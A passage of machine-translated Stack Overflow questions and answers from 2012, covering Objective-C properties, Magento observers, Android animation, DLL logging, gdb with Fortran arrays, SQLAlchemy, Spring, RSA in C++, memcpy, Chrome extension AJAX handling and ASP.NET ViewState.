```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:03:48.867

属性和 ivars 在概念上完全不同。

*属性*表示代码的逻辑组件。它可以但不必由 ivar 支持。它可以在运行时~~动态生成~~（如视图`-frame`）等。

*ivar*是实际分配的内存块，用于保存一些数据。

如果您（正确地）使用属性，您将获得开箱即用的 KVC/KVO 合规性等不错的功能。由于这个和其他原因，通常认为是一种很好的做法，尤其是在现代运行时，以属性的形式声明所有公共接口，并`@synthesize`在适当的情况下使用 ivars（经常使用）在内部支持它们。

就个人而言，我也更喜欢对私有数据使用属性，既可以方便以后公开（只需将声明移至标题！），也可以轻松提供属性的自定义实现（和 setter/ mutators) 而不是依赖简单的 ivar。

既然你提到了 ARC，我（还）没怎么用过它，但我认为只要你正确地声明你的财产，它应该不会有太大的不同。

# magento - 设置 Magento 事件数据

> ID：11786939
> 
> 赞同：0
> 
> 时间：2012-08-02T22:50:02.493
> 
> 标签：magento

因此，没有人对如何设置事件数据有很好的解释。我已经阅读了大量关于 getEvent 的帖子，并且只在 setEvent 上找到了 Magento 文档。

如何在 *before_save 上设置事件数据（从观察者返回）？

# 代码

```
public function onCategorySaveBefore($observer)
{
    $rules = Mage::getResourceModel('categoryrules/rules_collection');
    $keepSpecialFlag = 1;
    $event = $observer->getEvent();
    $categoryId = $event->getCategory()->getId();
    foreach ($rules as $r) {
        if ( $r['category_id'] != $categoryId ) {
            $keepSpecialFlag = 0;
        }
    }

    if ($keepSpecialFlag==0) {
#code needs saved here.  something like $event->setData('rogue_category_rule', 0);
    }
    return;
} 
```

# 配置文件

```
<catalog_category_save_before>
    <observers>
        <categoryrules>
            <type>singleton</type>
            <class>categoryrules/observer</class>
            <method>onCategorySaveBefore</method>
        </categoryrules>
    </observers>
</catalog_category_save_before> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T15:06:54.173

`Varien_Event`extends `Varien_Object`，所以你可以通过调用来设置任何参数

```
$observer->getEvent()->setData('you_parameter', 'some_ value'); 
```

或者

```
$observer->getEvent()->setYourParameter('some_ value'); 
```

**编辑**：但你也应该检查`Mage_Core_Model_App::dispatchEvent`方法实施。也许 Magento 会为每个观察者实例化新事件。在事件中设置一些值真的是个坏主意。通常事件是不可变的对象。

# android - 在自定义视图上闪烁 TranslateAnimation/ScaleAnimation

> ID：11786940
> 
> 赞同：1
> 
> 时间：2012-08-02T22:50:04.227
> 
> 标签：android, android-animation, android-view, flicker

我实现了一个自定义，它通过动画`View`应用自定义。即应用程序放大到更大位图的某个点（位图比屏幕大）。在更高分辨率的设备上（例如三星 Galaxy S3，它是 x-hdpi），缩放（实际上是缩放+平移）过程会严重**闪烁和卡顿。**（更准确地说，图像的许多**部分**闪烁，其他部分都可以。例如图像中包含的文本标题闪烁。）在其他设备上也有一些闪烁，例如Desire HD。（请注意，自定义 View 是必需的，因为稍后我也会在其上应用其他自定义动画，但现在无关紧要。）`ScaleAnimation/TranslateAnimation``getTransformation()`

 ****当动画开始时，位图被缩小（即从“距离”可见）。动画同时放大和平移。

我认为位图可能太大（实际上它并不小），但我尝试了一切都没有运气：我将正确的版本放入 hdpi、xhpdi 等，我也尝试使用较小尺寸的位图，我尝试通过 进行下采样`decodeResource()`，但没有帮助。

实际上，自定义`View`包含一个名为`MyBackgroundDrawable`. 该类`MyBackgroundDrawable`处理动画并绘制转换后的位图。

这是`onDraw()`自定义的代码`View`：

```
@Override 
protected void onDraw(Canvas canvas) {
    canvas.drawColor(Color.WHITE);
    mMyBackgroundDrawable.draw(canvas); // my custom Drawable

    invalidate();
} 
```

这就是我加载位图的方式：

```
Resources res = context.getResources();
BitmapFactory.Options opt = new BitmapFactory.Options();
opt.inScaled = false;
Bitmap bmp =  BitmapFactory.decodeResource(res, R.drawable.mybackground, opt);
Drawable mMyDrBackground = new BitmapDrawable(res, bmp); 
```

这是（即我的自定义）的`draw()`方法：`mMyBackgroundDrawable``Drawable`

```
@Override
public void draw(Canvas canvas) {
    int sc = canvas.save();

    sWorld.reset(); // this is a Matrix

    if (mMyAnimation!= null) {
        mMyAnimation.getTransformation(AnimationUtils.currentAnimationTimeMillis(), mTransformation);               
        sWorld = mTransformation.getMatrix();
    }

    sMatrix.reset();
    sMatrix.preTranslate(sViewportX / 2, sViewportY / 2);
    sMatrix.preConcat(sWorld);
    sMatrix.preConcat(mPosition);

    canvas.setMatrix(sMatrix);

    mMyDrBackground .draw(canvas);
    canvas.restoreToCount(sc);
} 
```

实际上，`mMyAnimation`是一个`AnimationSet`，并且（当闪烁发生时），它正在播放一个`TranslateAnimation+ScaleAnimation`（同时，因为我正在缩放并同时移动到位图的某个点）。

为什么会出现闪烁和卡顿，如何解决？

**更新**：我没有`onMeasure()`为自定义实现`View`。这会导致这样的问题吗？我的自定义视图被添加到这个布局中（即到`layoutRoot`）：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:id="@+id/layoutRoot" >
</RelativeLayout> 
```****

# c++ - 从动态库调用 fprintf (c++)

> ID：11786942
> 
> 赞同：2
> 
> 时间：2012-08-02T22:50:08.417
> 
> 标签：c++

我正在创建一个包含日志记录类的 Windows DLL 库，该类中的日志函数只是像这样调用 fprintf 以进行测试：

fprintf(stderr, "DEBUG: %s\n", "Hello");

现在，如果我从我的其他项目（使用库）的任何文件中的任何函数中使用它，这个调用就可以正常工作，但是如果我将它放在我的库中的任何位置，带有日志记录类，它根本不会打印任何东西。
我可以看到它正确运行函数（使用简单的 exit(0); 进行测试）。

现在我对 c/c++ 中的整个库概念仍然有点新，所以可能有些东西我只是不明白，但否则我不知道为什么它不起作用。

我试着在这里和谷歌上搜索，但我找不到其他人有同样的问题。
我使用 VC++ 2010

编辑：我想到了传递文件指针而不是仅使用库中的 stderr，这会导致抛出异常（文件的 _tmpfname 指针在抛出时为 NULL，我不确定这是正确的）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T23:18:04.587

我会避免对任何生产代码执行此操作（尽管可以进行测试）。标准 I/O 流属于应用程序，而[DLL 是家里的客人](http://blogs.msdn.com/b/oldnewthing/archive/2009/12/02/9931183.aspx)。如果您想提供调试输出，请允许应用程序设置用于记录的回调函数，例如：

```
// In your DLL's header file:
typedef void (*LogFunc)(const char *, ...);
void DLLEXPORT SetLogFunction(LogFunc logFunc);

// In your DLL's source file:
LogFunc g_LogFunc;
void DLLEXPORT SetLogFunction(LogFunc logFunc)
{
    g_LogFunc = logFunc;
}

...
// Then, instead of calling fprintf(stderr, "blah"), do this:
g_LogFunc("blah"); 
```

如果您只是为了测试而这样做，您可以直接写入`stderr`，但请记住，DLL 和应用程序必须链接到相同版本的 C 运行时才能使其工作。C 运行时本身就是一个 DLL，如果您的 DLL 和应用程序指定了不同版本的 C 运行时，您最终会将 C 运行时的两个单独副本加载到内存中，每个副本都有自己的`stderr`含义。当它们不同时，就会发生坏事。

在 Visual Studio 中，要设置您正在使用的 C 运行时库，请打开项目设置并转到**配置属性 → C/C++ → 代码生成 → 运行时库**，并确保 DLL 和应用程序都设置为准确相同的值（通常是“多线程 DLL (/MD)”或“多线程调试 DLL (/MDd)”，具体取决于您构建的是调试版本还是发布版本）。

# php - 在将其发送到数据库之前，在php中为手机号码添加前缀

> ID：11786943
> 
> 赞同：-5
> 
> 时间：2012-08-02T22:50:08.593
> 
> 标签：php

> **可能重复：**
> [请帮我验证 php 形式的手机号码](https://stackoverflow.com/questions/11786411/please-help-me-validate-mobile-no-in-php-form)

我有手机号码要验证，但我卡在前缀部分。

```
if(empty($_POST['mobileno'])) // phone number is not empty
{
$error[] = 'Please enter mobile number';
} else {
if(preg_match('/^\d{10}$/',$_POST['mobileno'])) // phone number is valid
{
  $mobile = $_POST['mobileno'];
  // your other code here
}
else // phone number is not valid
{
  $error[] = 'Phone number invalid !';
}
}
$prefix = 0;
$pmobile = $prefix . $mobile; 
```

这就是我要为前缀做的事情。这是正确的，因为我不能在数字前添加值 0。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:01:37.047

您是否尝试过使用正则表达式？

```
 //check the first section is singular or multi, check area code between 0 and 9, check any additional integers
 $pattern = "[0|00]+[0-9]+[^\\s]";
 $phone_number = "000263712702879"; //international phone number
 if(preg_match($pattern, $phone_number)) {
      echo "this is a number";
 } else echo "this not a number"; 
```

# android - 是否可以在没有源代码的情况下将针对 Android 编译的 .so 转换为针对 ubuntu 的 .so？

> ID：11786956
> 
> 赞同：0
> 
> 时间：2012-08-02T22:51:52.090
> 
> 标签：android, ubuntu, arm, shared-libraries

我有一个为 android 编译的库，我想在 ubuntu 上使用它的一些功能。

这是可能的，如果是，我该怎么做？

我没有源代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T23:00:33.773

做不到....除非您在同一平台上运行 Ubuntu 和 Android（至少相同的处理器架构）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T23:00:04.787

答案是否定的，因为 ARM 二进制文件在指令集方面与 x86 二进制文件不同。因此彼此不相容。

# arrays - 如何在 GDB 中打印 Fortran 数组？

> ID：11786958
> 
> 赞同：15
> 
> 时间：2012-08-02T22:52:03.180
> 
> 标签：arrays, fortran, gdb

在 C/C++ 中，我通常将指针打印为数组`name@dimension`。Fortran 的等价物是什么？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-03T11:24:57.170

Fortran 90 使用描述符来表示其数组的维度（形状）并传递假定形状的数组参数。Fortran 中的指针也很特殊——它们只能指向合格的目标。这允许在 Fortran 中比在 C/C++ 中更好的调试器自省。只需使用`print arr(index)`或其中一个`info`命令 - 不需要花哨的东西。

示例代码：

```
program arr
  real, dimension(40) :: stack_array
  real, allocatable, dimension(:), target :: heap_array
  real, dimension(:), pointer :: ptr_array
  integer :: i
  ! Interface required because of the assumed-shape array argument
  interface
    subroutine foo(bar, baz, qux, ptr)
      real, dimension(:) :: bar
      real, dimension(40) :: baz
      real, dimension(*) :: qux
      real, dimension(:), pointer :: ptr
    end subroutine foo
  end interface

  allocate(heap_array(40))

  forall(i = 1:40) stack_array(i) = i
  heap_array = stack_array + 2
  ptr_array => heap_array

  print *, stack_array(1)

  call foo(stack_array, stack_array, stack_array, ptr_array)

  deallocate(heap_array)
end program arr

subroutine foo(bar, baz, qux, ptr)
  real, dimension(:) :: bar
  real, dimension(40) :: baz
  real, dimension(*) :: qux
  real, dimension(:), pointer :: ptr

  print *, bar(1), baz(1), qux(1), ptr(1)
end subroutine foo 
```

使用调试信息编译并运行`gdb`：

```
$ gfortran -g -o arr.x arr.f90 && gdb ./arr.x
...
(gdb) info locals
heap_array = (3, 4, 5, 6, 7, 8, 9, 10, 11, 12, ...
ptr_array = (3, 4, 5, 6, 7, 8, 9, 10, 11, 12, ...
stack_array = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, ...
(gdb) print heap_array
$1 = (3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, ...
(gdb) print ptr_array(3:7)
$2 = (5, 6, 7, 8, 9)
...
(gdb) info args
bar = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, ...
baz = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, ...
qux = ()
ptr = (3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, ... 
```

由于显而易见的原因，它无法显示假定大小的数组参数的内容，但您可以单独打印每个元素：

```
(gdb) print qux(1)
$5 = 1
(gdb) print qux(2)
$6 = 2
(gdb) print qux(15)
$7 = 15 
```

请注意，打印数组部分不适用于假定大小的数组参数，因为它们不是由描述符传递并`gdb`遇到麻烦：

```
(gdb) print qux(1:8)
$8 = (0, 0, 0, 0, 0, 0, 2.25609053e-43, 0)
(gdb) print qux(2:9)
$9 = (0, 0, 0, 0, 0, 0, 2.25609053e-43, 0) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-06-14T10:39:27.200

我遇到了类似的问题，发现[这个](http://numericalnoob.blogspot.co.uk/2012/08/fortran-allocatable-arrays-and-pointers.html)和[这个](http://web.archive.org/web/20120307093404/http:/brulermavie.org/2012/02/how-to-debug-fortran-programs-using-gdb/)链接很有用。

归结为：如果您没有正确版本的 gdb 和 gfortran，则需要执行例如

```
(gdb) print *((real *)my_array + 2) 
```

或（在我的情况下）

```
(gdb) print *((real *)my_array + 2) 
```

打印数组的第二个元素。你也可以做

```
(gdb) print *((real_8 *)my_array + 2)@5 
```

查看数组元素 2、...、2+5。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-06-30T15:22:20.567

这在 gdb 7.7.1 中对我有用：

```
print A(1)@N 
```

其中 A 是数组，N 是要打印的元素数。对于二维数组：

```
print A(1,1)@N 
```

我知道这是一个老问题，但谷歌查询“gdb print fortran array”会导致这里。

# sqlalchemy - SQLAlchemy中的多态继承与反射

> ID：11786963
> 
> 赞同：0
> 
> 时间：2012-08-02T22:52:12.420
> 
> 标签：sqlalchemy

我有两个表，模式如下所示：

```
Table Auth:
 id: Integer, PrimaryKey
 type: String

Table Password_auth
 id: Integer, PrimaryKey, ForeignKey(Auth.id)
 password: String 
```

我在 SQLAlchemy 中使用连接继承来表示其类中的上述两个表。我使用类型作为多态性的鉴别器。只要我不使用反射，这一切都可以正常工作。一旦我使用反射，所有的地狱都会崩溃。

可以在 SQLAlchemy 中使用多态连接继承和反射吗？如果是这样，有人愿意给我一个例子来说明它是如何完成的吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T08:27:33.733

假设您使用的是[`declarative`extension](http://docs.sqlalchemy.org/en/rel_0_7/orm/extensions/declarative.html)，下面的代码应该会给您一个想法：

```
class Auth(Base):
    __table__ = Table('Auth', Base.metadata,
            autoload=True,
            autoload_with=engine)
    __mapper_args__ = {
            'polymorphic_on': 'type', 
            'polymorphic_identity': 'auth',
            }

class Password_Auth(Auth):
    __table__ = Table('Password_Auth', Base.metadata,
            autoload=True,
            autoload_with=engine)
    __mapper_args__ = {
            'polymorphic_identity': 'password_auth',
            } 
```

# python - 我正在尝试组合同一对象的两个列表，在 python 中使用不同的字段但相同类型的数据进行排序

> ID：11786964
> 
> 赞同：1
> 
> 时间：2012-08-02T22:52:45.117
> 
> 标签：python, django, list, sorting

所以在我的 Django 项目中，我创建了一个 Notification 模型，它有两个 datetime 字段，一个是时间戳，一个是截止日期。截止日期是可选的。现在我有一个通知列表，有些有截止日期，有些没有。它们都有一个时间戳。我要做的是使用具有该字段的通知的到期日期和没有该可选字段的通知的时间戳将它们排序在列表中。如您所见，我使用两个字段作为键有点奇怪，但它们都是日期时间字段。所以我认为他们应该能够比较。

我的代码：

```
class Notifications(models.Model):
date = models.DateTimeField(auto_now=True)
title = ...
content = ...
due_date = models.DateTimeField(null=True, blank=True) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:58:57.403

您想使用 SQL [`COALESCE`](http://en.wikipedia.org/wiki/Null_%28SQL%29#COALESCE)：

> 该`COALESCE`函数接受参数列表，返回列表中的第一个非 Null 值：

我不认为它有一个 django 聚合函数，但你可以这样做：

```
Notifications.objects.filter(**some_filter_args)
  .extra(select={"sortdate" : 'COALESCE("due_date", "date")'})
  .order_by("-sortdate") 
```

# spring - 控制器在移动到不同的包后停止工作

> ID：11786965
> 
> 赞同：0
> 
> 时间：2012-08-02T22:52:53.867
> 
> 标签：spring, dependency-injection, controller

我有一个项目，其中有很多控制器，其中一些使用注释和一些 XML 配置。他们有组件可以设置为`com.test`. `com.test.p1`当我移动控制器时，类似它的包装`com.test.p2`停止工作。我必须为它创建一个 XML 配置。我应该在 XML 配置中寻找什么来解决这个问题？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T11:44:09.627

对于带注释的控制器，在配置中使用它 `<context:component-scan base-package="com.test.p2" />`

对于 bean 定义，更改类属性 `<bean class="com.test.p2.className" >`

# c++ - C# 中的 RSA C++ 等效项

> ID：11786968
> 
> 赞同：1
> 
> 时间：2012-08-02T22:53:05.977
> 
> 标签：c++, rsa

几天来，我一直试图在 C++ 中获得与此 C# 代码等效的代码，但没有成功。

这是我的 C# 代码：

```
RSAParameters rsaParams = new RSAParameters();
rsaParams.Modulus = someByteArray;
rsaParams.Exponent = someByteArray1;
rsaParams.D = someByteArray2;
rsaParams.DP = someByteArray3;
rsaParams.DQ = someByteArray4;
rsaParams.P = someByteArray5;
rsaParams.Q = someByteArray6;
rsaParams.InverseQ = someByteArray7;

using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
{
    rsa.ImportParameters(rsaParams);
    byte[] encryptedData = rsa.Encrypt(toEncrypt, false);
} 
```

我只想获得相同的确切结果，但使用 C++（跨平台）。我查看了许多库/类，但它们似乎并不合理。首先，Crypto++ 非常棒，但我想要的只是 RSA，所以在我看来，拥有他们所有的散列/加密/其他算法只是一种浪费。我找到[了这个](http://code.google.com/p/rsa/)类，我认为它很好，因为它只是 RSA，而且非常小。问题是，参数的名称与 C# 的名称不同，或者它不支持它。我觉得我不应该仅仅为了实现它就必须了解每个参数在 RSA 中的含义，因为我只想在这里完成一个简单的任务。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T00:15:40.850

RSAParameters 结构的属性基于[Chinese Remainder Algorithm](http://en.wikipedia.org/wiki/RSA_%28algorithm%29#Using_the_Chinese_remainder_algorithm)。你看过[OpenSSL](http://www.openssl.org/docs/crypto/rsa.html#)加密库吗？

> RSA 结构由几个 BIGNUM 组件组成。它可以包含公共和私有 RSA 密钥：

```
struct
    {
    BIGNUM *n;              // public modulus
    BIGNUM *e;              // public exponent
    BIGNUM *d;              // private exponent
    BIGNUM *p;              // secret prime factor
    BIGNUM *q;              // secret prime factor
    BIGNUM *dmp1;           // d mod (p-1)
    BIGNUM *dmq1;           // d mod (q-1)
    BIGNUM *iqmp;           // q^-1 mod p
    // ...
    };
RSA 
```

# c - memcpy() 从较小的数组到较大的数组

> ID：11786970
> 
> 赞同：1
> 
> 时间：2012-08-02T22:53:14.283
> 
> 标签：c, arrays, memcpy

我找不到对这个问题的任何参考。我有一个结构数组，我需要将其调整为更大的数组。两个结构都已完全初始化（每个单元格的值都不是 NULL）

说

```
typedef struct Square {
...
...
}Square;

Square s1[1024];
Square s2[2048]; 
```

如果我使用 s1 复制`memcpy()`到 s2，s2 会是什么样子？我知道它复制字节数据。前 1024 个单元格是否会与 s1 相同，而其余 1024 个单元格会与它们初始化时一样吗？还是它也会影响他们？

谢谢

PS这里的数组是静态分配的，但我写这些只是为了方便。我有他们分配使用`malloc()`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T22:54:50.950

如果你这样做了：

```
memcpy(s2, s1, sizeof(s1)); 
```

中的前 1024`Square`秒`s2`将从 复制`s1`，其余的将保持不变（因此，如果它们未初始化，它们仍将未初始化）。

请记住，如果它们按照您所说的进行堆分配，则不能使用`sizeof`. 如果您要做的只是增加数组，您可能会发现[realloc很有用。](http://linux.die.net/man/3/realloc)

# javascript - 发生 ajax 请求时运行代码的 Chrome 扩展程序

> ID：11786976
> 
> 赞同：12
> 
> 时间：2012-08-02T22:53:55.970
> 
> 标签：javascript, ajax, google-chrome-extension

因此，对我的问题进行基本描述。

我现在（终于）有一个正在工作的扩展程序，它将电话号码包装在一种标签中。

它现在正在工作，但是我遇到了基于用户操作或基于 ajax 请求通过 JS 动态加载的任何内容的问题

例如，如果我单击 hotmail 电子邮件并打开它，脚本会起作用，但仅当我刷新页面以便电子邮件加载并调用我的 contentscript 时。

我想过通过让用户单击扩展的图标来解决这个问题，但这并不是真正要求的功能。

如果 Chrome 中有一种方法可以收听 ajax 请求（似乎有）[http://code.google.com/chrome/extensions/webRequest.html](http://code.google.com/chrome/extensions/webRequest.html) 这就是我想要做的，但我不确定如何来实现这一点。我把它当作听众吗？

我想出了另一种基于 DOM 何时更改的方法，但这使得加载需要很长时间，DOM 中发生的事情太多了，无法做到这一点。我需要监听 AJAX 请求并在它们完成后再次运行我的代码。

任何帮助甚至是正确方向的指针都会很棒=）

如果这是一个愚蠢的问题，请很好，我保证我一直在谷歌搜索并搜索答案，但我似乎找不到任何东西。有可能我知道的不够多，甚至无法提出正确的问题。我已经使用 javascript 大约两个星期了......所以我的学习曲线一直在艰难攀升。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-04T19:50:38.490

当你说...

> 我想出了另一种基于 DOM 何时更改的方法，但这使得加载需要很长时间，DOM 中发生的事情太多了，无法做到这一点。我需要监听 AJAX 请求并在它们完成后再次运行我的代码。

...您在哪里使用 Mutation Events 或 Mutation Observers？因为我认为观察者在哪里解决这个问题。我以前从未对 Observers 做过任何事情并使用过[Mutation Summary](http://code.google.com/p/mutation-summary/)。它似乎可以做你想做的事，除非它直到文件准备好/空闲（不确定是哪个）才开始观察，所以你可能必须对准备好的文件进行扫描，然后解雇观察者。
这是我的测试代码的样子（在内容脚本中）......

```
handleChanges = function(summaries) {
    // There may be more things to ignore
    var ignore = {
        SCRIPT: true,
        NOSCRIPT: true, 
        CDATA: true,
        '#comment': true
    }
    summaries.forEach(function(summary) {
        summary.added.forEach(function(node) {
            if (!ignore[node.nodeName] || (node.parentNode && !ignore[node.parentNode.nodeName]) && node.nodeValue.trim()) {
                node.nodeValue='PAEz woz ere - '+node.nodeValue;
            }
        })
    })

}

var observer = new MutationSummary({
    callback: handleChanges,
    // required
    rootNode: document,
    // optional, defaults to window.document
    observeOwnChanges: false,
    // optional, defaults to false
    queries: [{
        characterData: true
    }]
}); 
```

另一种检查 XMLHttpRequest 的方法是劫持它，它看起来像（在文档开始时的内容脚本中）......

```
function injectScript(source) {

    var elem = document.createElement("script"); //Create a new script element
    elem.type = "text/javascript"; //It's javascript
    elem.innerHTML = source; //Assign the source
    document.documentElement.appendChild(elem); //Inject it into the DOM
}

injectScript("("+(function() {

    function bindResponse(request, response) {
        request.__defineGetter__("responseText", function() {
            console.warn('Something tried to get the responseText');
            console.debug(response);
            return response;
        })
    }

    function processResponse(request,caller,method,path) {
        bindResponse(request, request.responseText);
    }

    var proxied = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function(method, path, async) {
            var caller = arguments.callee.caller;
            this.addEventListener('readystatechange', function() {
                if (this.readyState === 4)
                    processResponse(this,caller,method,path);
            }, true);
        return proxied.apply(this, [].slice.call(arguments));
    };
}).toString()+")()"); 
```

...我不是在超级棒的[Supper Happy Fun 博客](http://izaakschroeder.wordpress.com/)上学到的。
但正如您现在可能知道的那样，对于 ajax 驱动的站点来说，这还不够。通常，您必须为该站点编写一些特定的内容，或者 Mutation Observer 可能会满足您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-09-19T17:27:50.433

这是使用的更新答案`MutationObserver`，因为`MutationSummary`不再起作用：

```
var observer = new MutationObserver(function(mutationsList) {
  console.log(`Something has changed`);
});

observer.observe(document.querySelector('.whatever'), {
  attributes: true,
  characterData: true,
  childList: true,
  subtree: true
}); 
```

*   确保将`.whatever`选择器更改为您感兴趣的任何类/ID。
*   如果您对选择器的子修改感兴趣，请确保`true/false`在选项中指定。`subtree`

# objective-c - Xcode Project中的.c文件如何使用/实现？

> ID：11786980
> 
> 赞同：2
> 
> 时间：2012-08-02T22:54:20.793
> 
> 标签：objective-c, c, xcode, serial-port

我正在处理的 Xcode 项目包含`.c`我从[本教程](http://devdot.wikispaces.com/Iphone+Serial+Port+Tutorial)获取的一个文件， 我想打开串行端口并侦听传入的数据，因此我在`.m`我命名的文件中创建了一个方法`addRFID`。我将如何打开端口并侦听文件中 RX 行上的`.m`数据？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-03T06:44:51.240

c 文件可以以与 .m 文件完全相同的方式包含在您的项目中。我的建议是为该 .c 创建一个头文件（即创建一个 .h，在其中声明所有函数和变量、常量等），然后将其导入 .m，然后使用您认为合适的函数，直接从对象方法内部调用它们。

然后只需确保 .c 文件包含在您的目标中，以便它被编译并且一切正常。

总结一下：

1.  不要直接导入您的 .c 文件
2.  在目标中包含 .c 文件以进行编译
3.  制作一个 .h 文件来声明您直接导入的所有接口。

# asp.net - EnableViewState 在 DropDownList 中不起作用

> ID：11786981
> 
> 赞同：4
> 
> 时间：2012-08-02T22:54:35.177
> 
> 标签：asp.net

default.aspx 页面有一个`DropDownList`，只有当它不是`postback`. 选择值时，调用`Literal`具有所选值的方法填充a。它按预期工作。问题是当我将页面设置为仅在控件中不`EnableViewState`启用它时。`DropDownList`在这种情况下，当被退回时，`DropDownList`它会丢失它的物品。我已经设置了一个新的 Web 项目来测试它。没有母版页可以使其更简单。

默认.aspx：

```
<%@ Page Title="Home Page" Language="C#" AutoEventWireup="true"
    CodeBehind="Default.aspx.cs" Inherits="WebApplication4._Default" 
    EnableViewState="false" %>

<asp:DropDownList ID="DDL" runat="server" 
    OnSelectedIndexChanged="DDL_OSIC" 
    AutoPostBack="true" 
    EnableViewState="true">
</asp:DropDownList>

<asp:Literal ID="Literal1" runat="server"></asp:Literal> 
```

默认.aspx.cs：

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
        DDL.Items.Add("red");
        DDL.Items.Add("green");
        DDL.Items.Add("blue");
    }
}
protected void DDL_OSIC(object sender, EventArgs e)
{
    Literal1.Text = DDL.SelectedValue;
} 
```

为什么 EnableViewState 不起作用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T23:17:47.223

在已删除的答案的帮助下找到了答案。删除的答案是错误的，因为它不完整。有了这个提示，我找到[了 ViewStateMode 属性页](http://msdn.microsoft.com/en-us/library/system.web.ui.control.viewstatemode.aspx)。

Summarizing it to disable all controls' ViewState and enable it just for the choosen ones:

*   Set both the page and all the control's `EnableViewState` property to `true`. This is the default so it is not necessary to write anything
*   Set the page `ViewStateMode` to `Disabled`
*   Set `ViewStateMode` to `Enabled` in the control where you want ViewState enabled

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-09-13T09:56:31.873

In my computer,I create a web application.The result is same with you. I guess,when the page viewstate is false,control viewstate can't work.

# c++ - C++ 窗口父和子

> ID：11786987
> 
> 赞同：1
> 
> 时间：2012-08-02T22:55:03.400
> 
> 标签：c++, windows, winapi, window, parent-child

所以我创建了一个父窗口，然后使用 CreateWindowEx 创建了一个子窗口。现在，当我创建子窗口时，我给它一个样式 WS_POPUP。

MSDN 说：
WS_POPUP
0x80000000L
窗口是一个弹出窗口。此样式不能与 WS_CHILD 样式一起使用。

该窗口是一个弹出窗口，是我的另一个窗口的子窗口。我想我对 WS_CHILD 样式的用途感到困惑，因为我仍然可以让我的弹出窗口成为另一个窗口的子窗口？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T23:04:26.223

具有`WS_CHILD`样式的窗口必须保持在其父级的边界内。具有`WS_POPUP`样式的窗口不会，并且在`GetParent()`调用时返回所有者窗口（而不是父窗口）。

由于主要区别在于窗口是否必须留在父窗口的边界内，它们是互斥的，不能混合，因此 MSDN 文档中的注释。

# java - 我的 onClick 方法只有 80% 的时间有效

> ID：11786993
> 
> 赞同：0
> 
> 时间：2012-08-02T22:55:56.550
> 
> 标签：java, android, android-fragments, android-fragmentactivity

我有一个奇怪的视图设置`fragments`，`editText`基本上我需要在每次特定`editText`视图为`clicked`.

这有效，但只有大约 80% 的时间。

其他 20% 的失败时间，如果再次单击它，它会 100% 隐藏。

就好像你第一次敲击它时，它还没有来得及反应，在键盘弹出之前将片段隐藏起来。

我的 xml 将 Clickable 设置为 true，并将 onClick 设置为隐藏。

我的java在这里：

```
public void hide(View view) {

        FragmentTransaction transaction = getSupportFragmentManager()
                .beginTransaction();

        try {
            transaction.remove(timerFragment);
            transaction.commit();
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    } 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T08:10:51.293

我最终在另一个主题中解决了这个问题。我需要一个 onTouch 方法而不是一个 onClick。看这里：[onClick 事件没有触发 | 安卓](https://stackoverflow.com/questions/11790573/onclick-event-is-not-triggering-android)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T05:04:59.930

我希望它对你有帮助。

试试这个..

```
 public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);    

    final EditText ed1=(EditText)findViewById(R.id.editText1);
        final EditText ed2=(EditText)findViewById(R.id.editText2);

    ed1.setOnLongClickListener(new View.OnLongClickListener() {
        @Override
        public boolean onLongClick(View v) {
        // TODO Auto-generated method stub
        call();
        return false;
        }
        });

    ed2.setOnLongClickListener(new View.OnLongClickListener() {
        @Override
        public boolean onLongClick(View v) {
        // TODO Auto-generated method stub
        cal();
        return false;
        }
        });
}

public void call() {
        // TODO Auto-generated method stub
        Toast.makeText(getBaseContext(), "Hi", Toast.LENGTH_SHORT).show();
        //insert your codes here..
    }

    public void cal() {
        // TODO Auto-generated method stub
        Toast.makeText(getBaseContext(), "Hello", Toast.LENGTH_SHORT).show();
        //insert your codes here..
    } 
```

我的 xml 文件是：

```
<EditText
        android:id="@+id/editText1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content">
<requestFocus />
    </EditText> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T06:33:05.013

在我看来，你有两个潜在的问题，应该分解你的努力，一次解决一个。第一项任务是，验证您的点击处理程序是否 100% 工作。一旦你这样做了，然后看看验证你的片段代码是 100% 可靠的。

关于片段：

